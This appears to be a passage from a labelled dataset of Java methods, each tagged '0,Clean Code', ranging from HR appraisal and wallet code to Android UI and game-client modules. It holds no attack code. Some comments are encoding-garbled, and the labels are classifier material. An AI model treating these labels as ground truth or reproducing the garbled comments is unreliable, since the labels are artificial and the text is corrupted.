  List<Integer> oldSegIds=employeeSegService.lambdaQuery().select(HrmAchievementEmployeeSeg::getSegId).eq(HrmAchievementEmployeeSeg::getEmployeeId,employeeId).eq(HrmAchievementEmployeeSeg::getEmployeeAppraisalId,employeeAppraisalId).list().stream().map(HrmAchievementEmployeeSeg::getSegId).collect(Collectors.toList());
  if (CollUtil.isNotEmpty(oldSegIds)) {
    employeeSegService.removeByIds(oldSegIds);
    employeeSegItemService.lambdaUpdate().in(HrmAchievementEmployeeSegItem::getSegId,oldSegIds).remove();
  }
  employeeEvaluatoService.lambdaUpdate().eq(HrmAchievementEmployeeEvaluato::getEmployeeAppraisalId,employeeAppraisalId).remove();
  List<WriteAppraisalBO.SegListBean> segList=writeAppraisalBO.getSegList();
  List<HrmAchievementEmployeeSegItem> itemList=new ArrayList<>();
  for (int i=0; i < segList.size(); i++) {
    WriteAppraisalBO.SegListBean segBean=segList.get(i);
    HrmAchievementEmployeeSeg hrmAchievementEmployeeSeg=BeanUtil.copyProperties(segBean,HrmAchievementEmployeeSeg.class);
    hrmAchievementEmployeeSeg.setEmployeeAppraisalId(employeeAppraisalId);
    hrmAchievementEmployeeSeg.setEmployeeId(employeeId);
    hrmAchievementEmployeeSeg.setSort(i + 1);
    employeeSegService.save(hrmAchievementEmployeeSeg);
    List<HrmAchievementEmployeeSegItem> items=TransferUtil.transferList(segBean.getItems(),HrmAchievementEmployeeSegItem.class);
    for (int j=0; j < items.size(); j++) {
      HrmAchievementEmployeeSegItem item=items.get(j);
      item.setSegId(hrmAchievementEmployeeSeg.getSegId());
      item.setSort(j + 1);
      itemList.add(item);
    }
  }
  employeeSegItemService.saveBatch(itemList);
  if (writeAppraisalBO.getIsDraft() == 1) {
    HrmAchievementEmployeeAppraisal employeeAppraisal=getById(employeeAppraisalId);
    employeeAppraisal.setIsDraft(1);
    updateById(employeeAppraisal);
  }
 else {
    employeeAppraisalActionRecordService.submitAppraisalRecord(employeeAppraisalId);
    HrmAchievementEmployeeAppraisal employeeAppraisal=getById(employeeAppraisalId);
    employeeAppraisal.setIsDraft(0);
    updateById(employeeAppraisal);
    employeeAppraisal.setStatus(EmployeeAppraisalStatus.TO_BE_FILLED.getValue());
    addTargetConfirm(employeeAppraisal);
    HrmAchievementAppraisal hrmAchievementAppraisal=appraisalService.getById(employeeAppraisal.getAppraisalId());
    hrmAchievementAppraisal.setAppraisalSteps(0);
    appraisalService.updateById(hrmAchievementAppraisal);
  }
}",0,Clean Code
"@ParameterizedTest @CsvSource({""0,false,false"",""90,false,false"",""180,false,false"",""270,false,false"",""0,true,false"",""0,false,true"",""0,true,true""}) void testInsideComplexHole(int degrees,boolean flipX,boolean flipY) throws GeometryException {
  MutableCoordinateSequence outer=new MutableCoordinateSequence();
  outer.addPoint(1,1);
  outer.addPoint(10,1);
  outer.addPoint(10,10);
  outer.addPoint(1,10);
  outer.closeRing();
  MutableCoordinateSequence inner1=new MutableCoordinateSequence();
  inner1.addPoint(6.5,1.5);
  inner1.addPoint(2,2);
  inner1.addPoint(2,9);
  inner1.addPoint(9,9);
  inner1.addPoint(9,2);
  inner1.addPoint(4.6,2);
  inner1.addPoint(8,8);
  inner1.addPoint(3,8);
  inner1.addPoint(4,2);
  inner1.closeRing();
  MutableCoordinateSequence inner2=new MutableCoordinateSequence();
  inner2.addPoint(5.5,6.5);
  inner2.addPoint(5.5,6.6);
  inner2.addPoint(5.6,6.6);
  inner2.closeRing();
  flipAndRotate(outer,6,6,flipX,flipY,degrees);
  flipAndRotate(inner1,6,6,flipX,flipY,degrees);
  flipAndRotate(inner2,6,6,flipX,flipY,degrees);
  assertTrue(Orientation.isCCW(outer));
  assertFalse(Orientation.isCCW(inner1));
  assertFalse(Orientation.isCCW(inner2));
  testRender(List.of(List.of(outer,inner1)));
  testRender(List.of(List.of(outer,inner2)));
  testRender(List.of(List.of(outer,inner1,inner2)));
  var result=testRender(List.of(List.of(outer,inner2,inner1)));
  if (degrees == 0 && !flipX && !flipY) {
    var filled=StreamSupport.stream(result.getFilledTiles().spliterator(),false).collect(Collectors.toSet());
    assertTrue(filled.contains(TileCoord.ofXYZ(5,5,14)));
    assertTrue(filled.contains(TileCoord.ofXYZ(4,6,14)));
    assertFalse(filled.contains(TileCoord.ofXYZ(5,6,14)));
  }
}",0,Clean Code
"@Override public Map<String,String> getTransactions(Transport transport,Wallet wallet,Set<String> txids){
  JsonRpcClient client=new JsonRpcClient(transport);
  Map<String,String> result=new LinkedHashMap<>();
  for (  String txid : txids) {
    EventManager.get().post(new WalletHistoryStatusEvent(wallet,true,""Retrieving transaction ["" + txid.substring(0,6) + ""]""));
    try {
      String rawTxHex=new RetryLogic<String>(MAX_RETRIES,RETRY_DELAY,List.of(IllegalStateException.class,IllegalArgumentException.class)).getResult(() -> client.createRequest().returnAs(String.class).method(""blockchain.transaction.get"").id(idCounter.incrementAndGet()).params(txid).execute());
      result.put(txid,rawTxHex);
    }
 catch (    ServerException e) {
      throw new ElectrumServerRpcException(""Failed to retrieve transaction for txid ["" + txid.substring(0,6) + ""]"",e);
    }
catch (    Exception e) {
      result.put(txid,Sha256Hash.ZERO_HASH.toString());
    }
  }
  return result;
}",0,Clean Code
"/** 
 * Show or hide title view in  {@link BrowseSupportFragment} for fragments mapped to{@link PageRow}.  Otherwise the request is ignored, in that case BrowseSupportFragment is fully in control of showing/hiding title view. <p> When HeadersSupportFragment is visible, BrowseSupportFragment will hide search affordance view if there are other focusable rows above currently focused row.
 * @param show Boolean indicating whether or not to show the title view.
 */
void showTitleView(boolean show);
@Override public void showTitleView(boolean show){
  mShowTitleView=show;
  if (mMainFragmentAdapter == null || mMainFragmentAdapter.getFragmentHost() != this) {
    return;
  }
  if (!mIsPageRow) {
    return;
  }
  updateTitleViewVisibility();
}
",0,Clean Code
"/** 
 * 鏍规嵁鏌ュ嚭鏉ョ殑product鏌ュ嚭product涓嬬殑mapping
 * @param productObj product瀹炰緥
 * @return mapping鍒楄〃
 */
public JSONArray getPathByProduct(JSONObject productObj){
  JSONObject queryJson=new JSONObject();
  queryJson.put(""nodeTypePath"",productObj.getString(""nodeTypePath"").substring(""__xy__"".length()));
  JSONObject queryGrammarJson=getQueryGrammar.get(queryJson);
  JSONArray pathArray=new JSONArray();
  try {
    log.debug(String.format(""queryGrammarJson: %s"",queryGrammarJson));
    pathArray=elasticSearchSearchService.getNodesByRet(elasticSearchSearchService.search(applicationProperties.getProductopsPathMappingIndex(),null,JSONObject.toJSONString(queryGrammarJson),RequestMethod.POST,true));
  }
 catch (  Exception e) {
    log.error(""getPathByProduct has an exception!"",e);
  }
  return pathArray;
}
",0,Clean Code
"/** 
 * 鍒涘缓榛樿鐨勬瘮杈冨櫒
 * @param configs configs
 * @param defaultMode defaultMode
 * @return {@link Comparable}
 */
public static Comparable generate(List<FieldDiffConfig> configs,Comparator.CompareMode defaultMode){
  return generate(configs,defaultMode,false);
}
/** 
 * 鑾峰彇缁撴灉瀵规瘮姣旇緝鍣紝鍙敮鎸� 鍏ㄨ矾寰勫姣� 鍜� 鎺掗櫎鎸囧畾瀛楁瀵规瘮
 * @param configs configs
 * @param defaultMode defaultMode
 * @param http http
 * @return {@link Comparable}
 */
public static Comparable generate(List<FieldDiffConfig> configs,Comparator.CompareMode defaultMode,boolean http){
  if (null == configs || configs.size() == 0) {
    return ComparableFactory.instance().create(defaultMode);
  }
  List<String> paths=Lists.newArrayList();
  List<String> filedDiffNames=Lists.newArrayList();
  configs.forEach(cofig -> {
    if (StringUtils.startsWith(cofig.getFieldPath(),SYMBOL)) {
      if (http && (StringUtils.startsWith(cofig.getFieldPath(),""$.requestHeaders"") || StringUtils.startsWith(cofig.getFieldPath(),""$.requestParams"") || StringUtils.startsWith(cofig.getFieldPath(),""$.requestBody""))) {
        paths.add(cofig.getFieldPath().replace(SYMBOL,""$[0]""));
      }
 else {
        paths.add(cofig.getFieldPath());
      }
    }
 else {
      filedDiffNames.add(cofig.getFieldPath());
    }
  }
);
  return ComparableFactory.instance().create(paths,filedDiffNames);
}",0,Clean Code
"private void printLog(ServerWebExchange exchange){
  URI url=exchange.getAttribute(GATEWAY_REQUEST_URL_ATTR);
  Route route=exchange.getAttribute(GATEWAY_ROUTE_ATTR);
  LinkedHashSet<URI> uris=exchange.getAttribute(GATEWAY_ORIGINAL_REQUEST_URL_ATTR);
  URI originUri=null;
  if (uris != null) {
    originUri=uris.stream().findFirst().orElse(null);
  }
  if (url != null && route != null && originUri != null) {
    log.info(""转发请求：{}://{}{} --> 目标服务：{}，目标地址：{}://{}{}，转发时间：{}"",originUri.getScheme(),originUri.getAuthority(),originUri.getPath(),route.getId(),url.getScheme(),url.getAuthority(),url.getPath(),LocalDateTime.now());
  }
}
",0,Clean Code
"private void loadOtherRowAnimator(){
  final AnimatorUpdateListener updateListener=new AnimatorUpdateListener(){
    @Override public void onAnimationUpdate(    ValueAnimator arg0){
      if (getVerticalGridView() == null) {
        return;
      }
      final float fraction=(Float)arg0.getAnimatedValue();
      final int count=getVerticalGridView().getChildCount();
      for (int i=0; i < count; i++) {
        View view=getVerticalGridView().getChildAt(i);
        if (getVerticalGridView().getChildAdapterPosition(view) > 0) {
          view.setAlpha(fraction);
          view.setTranslationY((float)mAnimationTranslateY * (1f - fraction));
        }
      }
    }
  }
;
  Context context=getContext();
  mOtherRowFadeInAnimator=loadAnimator(context,R.animator.lb_playback_controls_fade_in);
  mOtherRowFadeInAnimator.addUpdateListener(updateListener);
  mOtherRowFadeInAnimator.setInterpolator(mLogDecelerateInterpolator);
  mOtherRowFadeOutAnimator=loadAnimator(context,R.animator.lb_playback_controls_fade_out);
  mOtherRowFadeOutAnimator.addUpdateListener(updateListener);
  mOtherRowFadeOutAnimator.setInterpolator(new AccelerateInterpolator());
}",0,Clean Code
"public void advertise(int advertisementMode){
  try {
    BluetoothAdapter defaultAdapter=BluetoothAdapter.getDefaultAdapter();
    if (defaultAdapter == null) {
      return;
    }
    String uniqueId=SharedPref.getStringParams(CoronaApplication.getInstance(),SharedPrefsConstants.UNIQUE_ID,Constants.EMPTY);
    if (uniqueId.isEmpty()) {
      return;
    }
    if (!uniqueId.equalsIgnoreCase(defaultAdapter.getName())) {
      stopAdvertising();
    }
    defaultAdapter.setName(uniqueId);
    advertiser=defaultAdapter.getBluetoothLeAdvertiser();
    AdvertiseSettings.Builder settingsBuilder=new AdvertiseSettings.Builder().setAdvertiseMode(advertisementMode).setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_ULTRA_LOW).setConnectable(true);
    ParcelUuid pUuid=new ParcelUuid(UUID.fromString(BuildConfig.SERVICE_UUID));
    AdvertiseData data=new AdvertiseData.Builder().setIncludeDeviceName(true).addServiceUuid(pUuid).setIncludeTxPowerLevel(false).build();
    if (advertiser != null) {
      try {
        startAdvertising(settingsBuilder,data,true);
      }
 catch (      Exception e) {
        if (e instanceof IllegalArgumentException && !TextUtils.isEmpty(e.getMessage()) && e.getMessage().contains(Constants.LEGACY_ISSUE)) {
          AnalyticsUtils.sendEvent(EventNames.ADVERTISING_LEGACY_ISSUE);
        }
        startAdvertising(settingsBuilder,data,false);
      }
    }
  }
 catch (  Exception ex) {
    CorUtilityKt.reportException(ex);
  }
}
",0,Clean Code
"public void loadFromDatabase(){
  var list=LunarCore.getGameDatabase().getObjects(PlayerLineup.class,""ownerUid"",getPlayer().getUid()).toList();
  for (  var lineup : list) {
    lineup.setOwner(this.getPlayer());
    try {
      this.lineups[lineup.getIndex()]=lineup;
    }
 catch (    Exception e) {
      lineup.delete();
    }
  }
  var extraList=LunarCore.getGameDatabase().getObjects(PlayerExtraLineup.class,""ownerUid"",getPlayer().getUid()).toList();
  for (  var lineup : extraList) {
    lineup.setOwner(this.getPlayer());
    try {
      this.extraLineups[lineup.getExtraLineupType()]=lineup;
    }
 catch (    Exception e) {
      lineup.delete();
    }
  }
  this.validate();
}
",0,Clean Code
"private void setDistance(T entity,Object[] sortValues,EntityInfo entityInfo){
  setDistance(entity,sortValues,entityInfo,null);
}
/** 
 * 璁剧疆璺濈
 * @param entity         瀹炰綋瀵硅薄
 * @param sortValues     鎺掑簭鍊�(鍚窛绂�)
 * @param entityInfo     瀹炰綋淇℃伅
 * @param baseSortParams 鐢ㄦ埛杈撳叆鐨勬帓搴忓弬鏁�
 */
private void setDistance(T entity,Object[] sortValues,EntityInfo entityInfo,List<BaseSortParam> baseSortParams){
  List<String> distanceFields=entityInfo.getDistanceFields();
  if (CollectionUtils.isEmpty(distanceFields) || ArrayUtils.isEmpty(sortValues) || CollectionUtils.isEmpty(baseSortParams)) {
    return;
  }
  for (int i=0, geoFieldIndex=0; i < sortValues.length; i++, geoFieldIndex++) {
    if (OrderTypeEnum.GEO != baseSortParams.get(i).getOrderTypeEnum()) {
      geoFieldIndex--;
      continue;
    }
    Object sortValue=sortValues[i];
    if (!(sortValue instanceof Double)) {
      continue;
    }
    double distance=(double)sortValue;
    if (Double.isNaN(distance)) {
      continue;
    }
    Integer distanceDecimalPlaces=entityInfo.getDistanceDecimalPlaces().get(geoFieldIndex);
    if (distanceDecimalPlaces > ZERO) {
      distance=NumericUtils.setDecimalPlaces(distance,distanceDecimalPlaces);
    }
    try {
      Method invokeMethod=BaseCache.setterMethod(entity.getClass(),distanceFields.get(geoFieldIndex));
      invokeMethod.invoke(entity,distance);
    }
 catch (    Throwable e) {
      LogUtils.formatError(""set distance error, entity:%s,sortValues:%s,distanceField:%s,e:%s"",entity,JSON.toJSONString(sortValues),distanceFields,e);
    }
  }
}",0,Clean Code
"/** 
 * 娣诲姞鍗曞厓鏍�
 */
public Cell addCell(Excel attr,Row row,T vo,Field field,int column){
  Cell cell=null;
  try {
    row.setHeight(maxHeight);
    if (attr.isExport()) {
      cell=row.createCell(column);
      if (isSubListValue(vo) && getListCellValue(vo).size() > 1 && attr.needMerge()) {
        CellRangeAddress cellAddress=new CellRangeAddress(subMergedFirstRowNum,subMergedLastRowNum,column,column);
        sheet.addMergedRegion(cellAddress);
      }
      cell.setCellStyle(styles.get(StringUtils.format(""data_{}_{}_{}_{}"",attr.align(),attr.color(),attr.backgroundColor(),attr.cellType())));
      Object value=getTargetValue(vo,field,attr);
      String dateFormat=attr.dateFormat();
      String readConverterExp=attr.readConverterExp();
      String separator=attr.separator();
      if (StringUtils.isNotEmpty(dateFormat) && StringUtils.isNotNull(value)) {
        cell.setCellValue(parseDateToStr(dateFormat,value));
      }
 else       if (StringUtils.isNotEmpty(readConverterExp) && StringUtils.isNotNull(value)) {
        cell.setCellValue(convertByExp(Convert.toStr(value),readConverterExp,separator));
      }
 else       if (value instanceof BigDecimal && -1 != attr.scale()) {
        cell.setCellValue((((BigDecimal)value).setScale(attr.scale(),attr.roundingMode())).doubleValue());
      }
 else       if (!attr.handler().equals(ExcelHandlerAdapter.class)) {
        cell.setCellValue(dataFormatHandlerAdapter(value,attr,cell));
      }
 else {
        setCellVo(value,attr,cell);
      }
      addStatisticsData(column,Convert.toStr(value),attr);
    }
  }
 catch (  Exception e) {
    log.error(""瀵煎嚭Excel澶辫触{}"",e);
  }
  return cell;
}",0,Clean Code
"@Override public String toString(){
  StringBuilder sb=new StringBuilder();
  sb.append(getClass().getSimpleName());
  sb.append("" ["");
  sb.append(""Hash = "").append(hashCode());
  sb.append("", id="").append(id);
  sb.append("", gmtCreate="").append(gmtCreate);
  sb.append("", gmtModified="").append(gmtModified);
  sb.append("", defId="").append(defId);
  sb.append("", appInstanceId="").append(appInstanceId);
  sb.append("", appComponentInstanceId="").append(appComponentInstanceId);
  sb.append("", gmtOccur="").append(gmtOccur);
  sb.append("", source="").append(source);
  sb.append("", type="").append(type);
  sb.append("", content="").append(content);
  sb.append("", serialVersionUID="").append(serialVersionUID);
  sb.append(""]"");
  return sb.toString();
}
",0,Clean Code
"private List<JSONObject> fetchModelDataFromResponse(SearchResponse response,InterfaceConfig interfaceConfig,boolean isAgg){
  List<InterfaceQueryField> queryFieldList=parseInterfaceQueryField(interfaceConfig.getQueryFields());
  List<InterfaceGroupField> groupFieldList=parseInterfaceGroupField(interfaceConfig.getGroupFields());
  List<String> responseFields=parseInterfaceResponseParam(interfaceConfig.getResponseParams());
  List<JSONObject> results;
  if (isAgg) {
    Aggregations aggs=response.getAggregations();
    results=parseAggs(aggs,groupFieldList,queryFieldList,responseFields,new JSONObject());
  }
 else {
    SearchHits hits=response.getInternalResponse().hits();
    results=parseHits(hits,queryFieldList,responseFields);
  }
  return results;
}
",0,Clean Code
"/** 
 * find the simplest constructor for specified class
 * @param clazz any class
 * @return best constructor
 */
public static Constructor<?> getBestConstructor(Class<?> clazz,boolean useGeneratedConstructor){
  Constructor<?> bestConstructor=null;
  int minimalExceptionCount=999;
  int minimalParameterCount=999;
  for (  Constructor<?> constructor : clazz.getDeclaredConstructors()) {
    Class<?>[] parameterTypes=constructor.getParameterTypes();
    Class<?>[] exceptionTypes=constructor.getExceptionTypes();
    if (parameterTypes.length == 1 && parameterTypes[0].equals(Void.class)) {
      if (useGeneratedConstructor) {
        return constructor;
      }
    }
 else     if (exceptionTypes.length < minimalExceptionCount || (exceptionTypes.length == minimalExceptionCount && parameterTypes.length < minimalParameterCount)) {
      minimalExceptionCount=exceptionTypes.length;
      minimalParameterCount=parameterTypes.length;
      bestConstructor=constructor;
    }
  }
  return bestConstructor;
}
/** 
 * find the simplest constructor including the testable generated one
 * @param clazz any class
 * @return best constructor
 */
public static Constructor<?> getBestConstructor(Class<?> clazz){
  return getBestConstructor(clazz,true);
}",0,Clean Code
"@SuppressLint(""ClickableViewAccessibility"") @Override public boolean onTouch(View v,MotionEvent event){
  Point point;
  int action=event.getAction();
  if (action == MotionEvent.ACTION_DOWN) {
    mDragging=false;
    point=new Point((int)event.getRawX(),(int)event.getRawY());
    mPressPosition.set(point.x,point.y);
    mWindowPosition.set(mWindowLayoutParams.x,mWindowLayoutParams.y);
    return true;
  }
 else   if (action == MotionEvent.ACTION_MOVE) {
    mDragging=true;
    point=new Point((int)event.getRawX(),(int)event.getRawY());
    int delX=point.x - mPressPosition.x;
    int delY=point.y - mPressPosition.y;
    mWindowLayoutParams.x=mWindowPosition.x + delX;
    mWindowLayoutParams.y=mWindowPosition.y + delY;
    updateLayout();
    return true;
  }
  if (!mDragging && v == mIconView && action == MotionEvent.ACTION_UP) {
    point=new Point((int)event.getRawX(),(int)event.getRawY());
    int delX=point.x - mPressPosition.x;
    int delY=point.y - mPressPosition.y;
    if (delX < 1 && delY < 1) {
      v.performClick();
      return true;
    }
  }
  return false;
}",0,Clean Code
"private int readLastPcrValue(ExtractorInput input,PositionHolder seekPositionHolder,int pcrPid) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)Math.min(TIMESTAMP_SEARCH_BYTES,inputLength);
  long searchStartPosition=inputLength - bytesToSearch;
  if (input.getPosition() != searchStartPosition) {
    seekPositionHolder.position=searchStartPosition;
    return Extractor.RESULT_SEEK;
  }
  packetBuffer.reset(bytesToSearch);
  input.resetPeekPosition();
  input.peekFully(packetBuffer.data,0,bytesToSearch);
  lastPcrValue=readLastPcrValueFromBuffer(packetBuffer,pcrPid);
  isLastPcrValueRead=true;
  return Extractor.RESULT_CONTINUE;
}",0,Clean Code
"/** 
 * Constructor used by the default  {@link FragmentFactory}. You must {@link FragmentManager#setFragmentFactory(FragmentFactory) set a custom FragmentFactory}if you want to use a non-default constructor to ensure that your constructor is called when the fragment is re-instantiated. <p>It is strongly recommended to supply arguments with  {@link #setArguments}and later retrieved by the Fragment with  {@link #getArguments}. These arguments are automatically saved and restored alongside the Fragment. <p>Applications should generally not implement a constructor. Prefer {@link #onAttach(Context)} instead. It is the first place application code can run wherethe fragment is ready to be used - the point where the fragment is actually associated with its context. Some applications may also want to implement  {@link #onInflate} to retrieveattributes from a layout resource, although note this happens when the fragment is attached.
 */
public Fragment(){
  initLifecycle();
}
/** 
 * Alternate constructor that can be used to provide a default layout that will be inflated by  {@link #onCreateView(LayoutInflater,ViewGroup,Bundle)}.
 * @see #Fragment()
 * @see #onCreateView(LayoutInflater,ViewGroup,Bundle)
 */
@ContentView public Fragment(@LayoutRes int contentLayoutId){
  this();
  mContentLayoutId=contentLayoutId;
}
",0,Clean Code
"@Override public SimpleHrmEmployeeVO transferSimpleEmp(HrmEmployee employee){
  SimpleHrmEmployeeVO simpleHrmEmployeeVO=new SimpleHrmEmployeeVO();
  simpleHrmEmployeeVO.setEmployeeId(employee.getEmployeeId());
  simpleHrmEmployeeVO.setEmployeeName(employee.getEmployeeName());
  int status=1;
  if (employee.getIsDel() == 1) {
    status=3;
  }
  if (employee.getIsDel() == 0 && employee.getEntryStatus().equals(EmployeeEntryStatus.IN.getValue())) {
    status=1;
  }
  if (employee.getIsDel() == 0 && (employee.getEntryStatus().equals(EmployeeEntryStatus.ALREADY_LEAVE.getValue()) || employee.getEntryStatus().equals(EmployeeEntryStatus.TO_IN.getValue()))) {
    status=2;
  }
  simpleHrmEmployeeVO.setStatus(status);
  simpleHrmEmployeeVO.setPost(employee.getPost());
  if (null != employee.getDeptId()) {
    DeptVO deptVO=hrmDeptService.queryById(employee.getDeptId());
    if (deptVO != null) {
      simpleHrmEmployeeVO.setDeptName(deptVO.getName());
    }
  }
  return simpleHrmEmployeeVO;
}",0,Clean Code
"public static String getCookieFirstValue(Map<String,Collection<String>> valueMaps,String key){
  if (CollectionUtils.isEmpty(valueMaps)) {
    return StringUtils.EMPTY;
  }
  Collection<String> values=valueMaps.get(HttpHeaderNames.COOKIE.toString());
  if (CollectionUtils.isEmpty(values)) {
    return StringUtils.EMPTY;
  }
  for (  String value : values) {
    String[] cookieArray=StringUtils.split(value,"";"");
    for (    String cookieValue : cookieArray) {
      String[] cookieKV=StringUtils.split(cookieValue,""="");
      if (cookieKV != null && cookieKV.length == 2 && StringUtils.equals(cookieKV[0],key)) {
        return cookieKV[1];
      }
    }
  }
  return StringUtils.EMPTY;
}",0,Clean Code
"/** 
 * Get the package name and the main application name from the manifest file
 */
public static Pair parseManifestFile(String filePath){
  AXmlResourceParser parser=new AXmlResourceParser();
  File file=new File(filePath);
  String packageName=null;
  String applicationName=null;
  if (!file.exists()) {
    System.out.println("" manifest file not exist!!! filePath -> "" + filePath);
    return null;
  }
  FileInputStream inputStream=null;
  try {
    inputStream=new FileInputStream(file);
    parser.open(inputStream);
    while (true) {
      int type=parser.next();
      if (type == XmlPullParser.END_DOCUMENT) {
        break;
      }
      if (type == XmlPullParser.START_TAG) {
        int attrCount=parser.getAttributeCount();
        for (int i=0; i < attrCount; i++) {
          String attrName=parser.getAttributeName(i);
          int attrNameRes=parser.getAttributeNameResource(i);
          String name=parser.getName();
          if (""manifest"".equals(name)) {
            if (""package"".equals(attrName)) {
              packageName=parser.getAttributeValue(i);
            }
          }
          if (""application"".equals(name)) {
            if (""name"".equals(attrName) || attrNameRes == 0x01010003) {
              applicationName=parser.getAttributeValue(i);
            }
          }
          if (packageName != null && packageName.length() > 0 && applicationName != null && applicationName.length() > 0) {
            return new Pair(packageName,applicationName);
          }
        }
      }
 else       if (type == XmlPullParser.END_TAG) {
      }
    }
  }
 catch (  XmlPullParserException|IOException e) {
    e.printStackTrace();
    System.out.println(""parseManifestFile failed, reason --> "" + e.getMessage());
  }
 finally {
    if (inputStream != null) {
      try {
        inputStream.close();
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
    }
  }
  return new Pair(packageName,applicationName);
}",0,Clean Code
"@EventHandler private void onPreTick(TickEvent.Pre event){
  int minY=mc.world.getBottomY();
  if (mc.player.getY() > minY || mc.player.getY() < minY - 15) {
    if (hasRun && mode.get() == Mode.Flight && Modules.get().isActive(Flight.class)) {
      Modules.get().get(Flight.class).toggle();
      hasRun=false;
    }
    return;
  }
switch (mode.get()) {
case Flight:
{
      if (!Modules.get().isActive(Flight.class))       Modules.get().get(Flight.class).toggle();
      hasRun=true;
    }
case Jump:
  ;
}
}",0,Clean Code
"private int layoutPunctuationsAndReturnStartIndexOfMoreSuggestions(final PunctuationSuggestions punctuationSuggestions,final ViewGroup stripView){
  final int countInStrip=Math.min(punctuationSuggestions.size(),PUNCTUATIONS_IN_STRIP);
  for (int positionInStrip=0; positionInStrip < countInStrip; positionInStrip++) {
    if (positionInStrip != 0) {
      addDivider(stripView,mDividerViews.get(positionInStrip));
    }
    final TextView wordView=mWordViews.get(positionInStrip);
    final String punctuation=punctuationSuggestions.getLabel(positionInStrip);
    wordView.setTag(positionInStrip);
    wordView.setText(punctuation);
    wordView.setContentDescription(punctuation);
    wordView.setTextScaleX(1.0f);
    wordView.setCompoundDrawables(null,null,null,null);
    wordView.setTextColor(mColorAutoCorrect);
    stripView.addView(wordView);
    setLayoutWeight(wordView,1.0f,mSuggestionsStripHeight);
  }
  mMoreSuggestionsAvailable=(punctuationSuggestions.size() > countInStrip);
  return countInStrip;
}",0,Clean Code
"public void setParent(View parent){
  if (this.parent == parent)   return;
  if (this.parent != null) {
    this.parent.removeOnAttachStateChangeListener(parentAttachListener);
    if (this.parent.isAttachedToWindow() && !parent.isAttachedToWindow()) {
      imageReceiver.onDetachedFromWindow();
    }
  }
  if ((this.parent == null || !this.parent.isAttachedToWindow()) && parent != null && parent.isAttachedToWindow()) {
    imageReceiver.onAttachedToWindow();
  }
  this.parent=parent;
  imageReceiver.setParentView(parent);
  if (parent != null) {
    parent.addOnAttachStateChangeListener(parentAttachListener);
  }
}
",0,Clean Code
"@LayoutMode public static int sanitizeLayoutMode(int layoutMode){
  if (layoutMode != GalleryView.LAYOUT_LEFT_TO_RIGHT && layoutMode != GalleryView.LAYOUT_RIGHT_TO_LEFT && layoutMode != GalleryView.LAYOUT_TOP_TO_BOTTOM) {
    return GalleryView.LAYOUT_LEFT_TO_RIGHT;
  }
 else {
    return layoutMode;
  }
}
",0,Clean Code
"/** 
 * @see Explosion#getExposure(Vec3d,Entity)
 */
private static float getExposure(Vec3d source,Box box,RaycastFactory raycastFactory){
  double xDiff=box.maxX - box.minX;
  double yDiff=box.maxY - box.minY;
  double zDiff=box.maxZ - box.minZ;
  double xStep=1 / (xDiff * 2 + 1);
  double yStep=1 / (yDiff * 2 + 1);
  double zStep=1 / (zDiff * 2 + 1);
  if (xStep > 0 && yStep > 0 && zStep > 0) {
    int misses=0;
    int hits=0;
    double xOffset=(1 - Math.floor(1 / xStep) * xStep) * 0.5;
    double zOffset=(1 - Math.floor(1 / zStep) * zStep) * 0.5;
    xStep=xStep * xDiff;
    yStep=yStep * yDiff;
    zStep=zStep * zDiff;
    double startX=box.minX + xOffset;
    double startY=box.minY;
    double startZ=box.minZ + zOffset;
    double endX=box.maxX + xOffset;
    double endY=box.maxY;
    double endZ=box.maxZ + zOffset;
    for (double x=startX; x <= endX; x+=xStep) {
      for (double y=startY; y <= endY; y+=yStep) {
        for (double z=startZ; z <= endZ; z+=zStep) {
          Vec3d position=new Vec3d(x,y,z);
          if (raycast(new ExposureRaycastContext(position,source),raycastFactory) == null)           misses++;
          hits++;
        }
      }
    }
    return (float)misses / hits;
  }
  return 0f;
}",0,Clean Code
"/** 
 * Creates a VP9 decoder.
 * @param numInputBuffers The number of input buffers.
 * @param numOutputBuffers The number of output buffers.
 * @param initialInputBufferSize The initial size of each input buffer.
 * @param exoMediaCrypto The {@link ExoMediaCrypto} object required for decoding encryptedcontent. Maybe null and can be ignored if decoder does not handle encrypted content.
 * @param disableLoopFilter Disable the libvpx in-loop smoothing filter.
 * @param enableRowMultiThreadMode Whether row multi threading decoding is enabled.
 * @param threads Number of threads libvpx will use to decode.
 * @throws VpxDecoderException Thrown if an exception occurs when initializing the decoder.
 */
public VpxDecoder(int numInputBuffers,int numOutputBuffers,int initialInputBufferSize,ExoMediaCrypto exoMediaCrypto,boolean disableLoopFilter,boolean enableRowMultiThreadMode,int threads) throws VpxDecoderException {
  super(new VpxInputBuffer[numInputBuffers],new VpxOutputBuffer[numOutputBuffers]);
  if (!VpxLibrary.isAvailable()) {
    throw new VpxDecoderException(""Failed to load decoder native libraries."");
  }
  this.exoMediaCrypto=exoMediaCrypto;
  if (exoMediaCrypto != null && !VpxLibrary.vpxIsSecureDecodeSupported()) {
    throw new VpxDecoderException(""Vpx decoder does not support secure decode."");
  }
  vpxDecContext=vpxInit(disableLoopFilter,enableRowMultiThreadMode,threads);
  if (vpxDecContext == 0) {
    throw new VpxDecoderException(""Failed to initialize decoder"");
  }
  setInitialInputBufferSize(initialInputBufferSize);
}",0,Clean Code
"@Override public void onFailure(EventSource eventSource,Throwable t,Response response){
  try {
    if (Objects.isNull(response)) {
      String message=t.getMessage();
      Message sseMessage=new Message();
      sseMessage.setContent(message);
      sseEmitter.send(SseEmitter.event().id(""[ERROR]"").data(sseMessage));
      sseEmitter.send(SseEmitter.event().id(""[DONE]"").data(""[DONE]""));
      sseEmitter.complete();
      return;
    }
    ResponseBody body=response.body();
    String bodyString=Objects.nonNull(t) ? t.getMessage() : """";
    if (Objects.nonNull(body)) {
      bodyString=body.string();
      if (StringUtils.isBlank(bodyString) && Objects.nonNull(t)) {
        bodyString=t.getMessage();
      }
      log.error(""Fast Chat AI sse response锛歿}"",bodyString);
    }
 else {
      log.error(""Fast Chat AI sse response锛歿}锛宔rror锛歿}"",response,t);
    }
    eventSource.cancel();
    Message message=new Message();
    message.setContent(""Fast Chat AI error锛�"" + bodyString);
    sseEmitter.send(SseEmitter.event().id(""[ERROR]"").data(message));
    sseEmitter.send(SseEmitter.event().id(""[DONE]"").data(""[DONE]""));
    sseEmitter.complete();
  }
 catch (  Exception exception) {
    log.error(""Fast Chat AI send data error:"",exception);
  }
}
",0,Clean Code
"@Override public LdapUser store(LdapTransformUser ldapTransformUser){
  LdapUser user=new LdapUser();
